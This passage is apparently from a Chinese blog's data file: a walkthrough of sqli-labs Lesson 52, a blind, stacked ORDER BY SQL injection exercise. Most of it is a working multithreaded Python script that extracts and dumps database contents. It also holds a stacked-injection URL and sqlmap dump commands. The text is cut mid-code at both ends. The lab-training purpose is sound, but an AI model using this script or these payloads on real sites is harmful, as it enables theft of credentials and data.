i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, basehtml, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, basehtml, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    basehtml = getbasehtml(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.17.35:8082/Less-52/?sort=rand(true)'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url, basehtml)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, basehtml, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p><code>http://10.60.17.35:8082/Less-52/?sort=rand(false);create+table+less52+like+users</code></p>\n<p><img src=\"/img/sql/Lesson-52/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-52/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-52/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-52/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20 -D security -T users -C username,password --dump</code></p>\n<p><img src=\"/img/sql/Lesson-52/012.png\" alt=\"012\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入\"></a>sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-52/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>数字型是受排序方式影响的</p>\n<p><img src=\"/img/sql/Lesson-52/002.png\" alt=\"002\"></p>\n<p>这里与上一课不同,没有报错。</p>\n<h3 id=\"布尔型注入利用\"><a href=\"#布尔型注入利用\" class=\"headerlink\" title=\"布尔型注入利用\"></a>布尔型注入利用</h3><p>发现rand(true)和rand(false)返回值不同,可以利用布尔盲注脚本代替手注过程。</p>\n<p><img src=\"/img/sql/Lesson-52/003.png\" alt=\"003\"></p>\n<p>拿之前的写过的布尔脚本改一改。</p>\n<p><img src=\"/img/sql/Lesson-52/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-52/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-52/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-52/007.png\" alt=\"007\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#l52.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbasehtml</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    basehtml = requests.get(url, headers=headers).content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> basehtml</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, basehtml, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).content</span><br><span class=\"line\">            <span class=\"keyword\">if</span> basehtml == html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, basehtml, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT 